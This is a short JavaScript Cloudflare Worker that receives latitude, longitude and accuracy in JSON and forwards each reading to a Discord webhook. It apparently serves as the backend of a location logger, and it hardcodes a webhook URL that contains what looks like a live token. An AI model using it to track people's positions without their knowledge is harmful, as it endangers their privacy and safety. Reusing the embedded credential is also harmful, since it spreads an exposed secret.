addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

const WEBHOOK_URL = "https://discord.com/api/webhooks/1455587749133422779/Dj7Kic95o6avV_I-m0TzKVXGqmuFuO59X9B3YD4cnfjPlwSRcLHcKrvSX367FJnd9UUP" // Replace with your webhook

async function handleRequest(request) {
  try {
    const data = await request.json() // {lat, lon, acc}
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `📍 New location\nLat: ${data.lat}\nLon: ${data.lon}\nAccuracy: ±${data.acc}m`
      })
    })
    return new Response(JSON.stringify({status: "ok"}), {status: 200})
  } catch (err) {
    return new Response(JSON.stringify({status: "error", message: err.message}), {status: 500})
  }
}
